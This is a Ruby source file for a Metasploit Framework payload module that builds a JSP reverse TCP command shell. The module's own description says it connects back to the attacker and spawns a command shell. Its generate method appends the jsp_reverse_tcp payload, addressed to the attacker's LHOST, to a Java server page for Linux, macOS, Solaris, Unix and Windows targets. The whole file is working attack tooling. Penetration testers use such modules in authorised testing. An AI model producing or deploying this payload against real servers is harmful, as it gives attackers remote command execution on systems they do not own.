##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 1501

  include Msf::Payload::Single
  include Msf::Payload::JSP
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Java JSP Command Shell, Reverse TCP Inline',
        'Description' => 'Connect back to attacker and spawn a command shell',
        'Author' => [ 'sf' ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux osx solaris unix win],
        'Arch' => ARCH_JAVA,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  def generate(_opts = {})
    if !datastore['LHOST'] || datastore['LHOST'].empty?
      return super
    end

    return super + jsp_reverse_tcp
  end
end
